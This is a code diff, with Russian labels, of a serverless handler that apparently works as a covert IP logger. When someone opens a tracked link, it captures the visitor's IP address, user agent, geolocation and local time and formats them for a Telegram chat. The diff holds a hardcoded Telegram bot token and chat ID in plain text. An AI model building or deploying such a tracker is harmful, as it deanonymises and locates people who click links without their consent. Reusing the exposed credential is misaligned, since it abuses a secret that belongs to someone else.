@@ -1,9 +1,13 @@
 export default async function handler(req, res) {
-  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
+  const ip = req.headers["x-forwarded-for"]?.split(',')[0] || req.socket.remoteAddress;
   const ua = req.headers["user-agent"] || "N/A";
   const slug = req.query.slug || "неизвестно";
-  const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
-  const geo = await geoRes.json().catch(() => ({}));
+  
+  let geo = {};
+  try {
+    const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
+    geo = await geoRes.json();
+  } catch (_) {}
 
   const message = `
 🔗 Ссылка: ${slug}
@@ -15,7 +19,7 @@ export default async function handler(req, res) {
 🕰️ Локальное время: \`${geo.utc_offset || "?"}\`
 💻 Платформа: \`${ua.includes("Windows") ? "Windows" : ua.includes("Android") ? "Android" : "Другая"}\`
 🧾 UA: \`${ua}\`
-`.trim();
+  `.trim();
 
   const token = "7329999473:AAEglilZMhtE6Iyr_uhLLRlI-32cIROEmNY";
   const chatId = "2079893058";
